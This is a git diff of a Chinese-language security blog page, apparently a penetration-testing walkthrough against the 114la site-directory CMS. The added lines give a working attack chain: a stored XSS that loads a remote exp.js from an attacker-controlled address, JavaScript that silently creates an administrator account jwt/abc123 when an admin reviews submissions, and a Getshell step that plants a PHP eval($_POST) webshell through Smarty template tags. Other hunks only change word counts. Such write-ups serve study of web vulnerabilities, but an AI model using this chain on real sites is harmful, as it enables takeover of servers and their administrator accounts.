@@ -524,7 +524,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    754
+                    869
                 </div>
                 
 
@@ -571,8 +571,8 @@ app_db<span class="token punctuation">:</span><span class="token punctuation">:<
 <p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200607160242.png" alt></p>
 <p>当管理员在后台访问收录管理时，注入的JS代码就会执行，可以看到成功弹框</p>
 <p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200607160053.png" alt></p>
-<p>既然JS代码能够成功执行，那我们插入一个添加管理员账户的JS文件,等待管理员查看网站收录审核的时候就会执行JS文件，创建一个管理员账号，后续我们进入后台来Getshell</p>
-<pre><code>&lt;script src=http://1/exp.js&gt;&lt;/script&gt;;</code></pre><p><code>exp.js</code></p>
+<p>既然JS代码能够成功执行，那我们插入一个添加管理员账户的远程JS文件,等待管理员查看网站收录审核的时候就会执行JS文件，从而创建一个管理员账号，后续我们进入后台来Getshell</p>
+<pre><code>&lt;script src=http://192.168.1.109/exp.js&gt;&lt;/script&gt;;</code></pre><p><code>exp.js</code>用来创建一个用户名密码为<code>jwt/abc123</code>的管理员</p>
 <pre class="line-numbers language-javascript"><code class="language-javascript"><span class="token keyword">var</span> siteurl <span class="token operator">=</span> document<span class="token punctuation">.</span>URL<span class="token punctuation">;</span>
 siteurl <span class="token operator">=</span> siteurl<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex">/(.*\/){0,}([^\.]+).*/ig</span><span class="token punctuation">,</span><span class="token string">"$1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token keyword">var</span> username<span class="token operator">=</span><span class="token string">"jwt"</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//用户名</span>
@@ -609,7 +609,17 @@ xmlhttp<span class="token punctuation">.</span><span class="token function">setR
 xmlhttp<span class="token punctuation">.</span><span class="token function">setRequestHeader</span><span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">"application/x-www-form-urlencoded"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
 xmlhttp<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">"auth%5Bmember114laurl_add114lafeedback%5D=1&amp;auth%5Bconfig114la%5D=1&amp;auth%5Bfamous_nav114lafamous_loop_playfamous_nav_tab114laindex_site114laindex_tool114lamztopl114larecycler%5D=1&amp;auth%5Bzhuanti114lazhuanti_class%5D=1&amp;auth%5Badvise_index114lakey%5D=1&amp;auth%5Bbackup114larestore114larepair114laclear114lamysites%5D=1&amp;auth%5Btemplate_manage%5D=1&amp;auth%5Bmake_html114la%5D=1&amp;auth%5Bheader114lamenu114lawelcome114laframe114lalogin%5D=1&amp;auth%5Bsecurity114la%5D=1&amp;auth%5Bsite_manage%5D=1&amp;auth%5Bplan%5D=1&amp;auth%5Bclass%5D=1&amp;auth%5Blog%5D=1&amp;step=2&amp;name="</span> <span class="token operator">+</span> username<span class="token punctuation">)</span><span class="token punctuation">;</span>
 <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>其它的符合要求就OK..然后提交..等待管理员查看网站收录审核的时候就会执行那个js文件.<br>这里我放一个添加管理员账户的js,其实可以直接拿shell的</p>
+<p>我们自己模拟管理员进后台查看收录管理一下，然后去用户管理中查看是否新建了jwt用户</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200607164030.png" alt></p>
+<p>不出所料，果然成功创建了jwt管理员</p>
+<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><p>由于114la网站使用的smarty模板引擎,而smarty支持插入php代码,这样就会导致漏洞产生了</p>
+<blockquote>
+<p><strong>smarty里面执行PHP代码 :</strong> <code>&lt;{php}&gt;代码&lt;{/php}&gt;</code></p>
+</blockquote>
+<p>那我们登录jwt用户,进入模板管理-&gt;申请收录版块-&gt;插入PHP一句话木马</p>
+<pre class="line-numbers language-php"><code class="language-php"><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>{php}</span><span class="token punctuation">></span></span></span>@<span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token markup">&lt;{/php}></span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>然后我们用🐜🗡连接，到这里我们就成功Getshell了</p>
+<p><img src="https://cdn.jsdelivr.net/gh/jwt1399/cdn//img/20200607164003.png" alt></p>
 
             </div>
             <hr/>
@@ -1378,7 +1388,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">145.6k</span>&nbsp;字
+                class="white-color">145.7k</span>&nbsp;字
             
             
             
